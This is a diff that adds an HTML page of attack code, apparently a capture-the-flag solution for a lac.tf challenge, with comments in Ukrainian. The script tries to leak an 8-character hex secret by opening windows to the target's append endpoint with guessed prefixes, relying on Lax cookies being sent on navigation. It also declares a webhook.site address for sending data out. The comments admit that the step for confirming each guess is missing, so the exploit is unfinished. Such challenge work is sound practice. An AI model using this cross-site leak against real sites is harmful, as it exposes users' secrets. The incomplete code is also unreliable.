@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Exploit Running...</h1>
+    <script>
+        const TARGET = "https://append-note-qy52d.instancer.lac.tf/";
+        const ALPHABET = "0123456789abcdef";
+        let currentSecret = "";
+        const WEBHOOK = "https://webhook.site/813e752f-c17f-4c9f-9dde-ec9605ff6a59"; // Наприклад, з webhook.site
+
+        async function tryChar(char) {
+            return new Promise((resolve) => {
+                // Відкриваємо вікно. Оскільки це навігація, Lax-куки будуть відправлені
+                const payload = `${TARGET}/append?content=${currentSecret}${char}&url=${TARGET}/`;
+                const win = window.open(payload, '_blank');
+
+                // Ми чекаємо трохи, поки відбудеться рендер redirect.html
+                // Якщо статус 200, сторінка завантажиться. Якщо 404 - теж, 
+                // але в даному завданні oracle спрацьовує на самому факті запиту.
+                
+                setTimeout(() => {
+                    if (win) win.close();
+                    resolve();
+                }, 500); 
+            });
+        }
+
+        async function run() {
+            // Оскільки додаток додає кожну спробу в notes.append, 
+            // ми маємо бути обережні. Але SECRET вже є в notes.
+            // Коректна стратегія: перевіряти статус відповіді через об'єкт вікна (якщо немає SOP)
+            // Або використовувати різницю в часі виконання редиректу.
+            
+            for (let i = 0; i < 8; i++) {
+                for (let c of ALPHABET) {
+                    await tryChar(c);
+                    // Тут потрібен механізм підтвердження, чи був статус 200.
+                    // У Flask статус 200 повертається, якщо note.startswith(content)
+                }
+            }
+        }
+
+        // Бот має клікнути по сторінці, щоб дозволити window.open
+        window.onclick = () => { run(); };
+    </script>
+</body>
+</html>
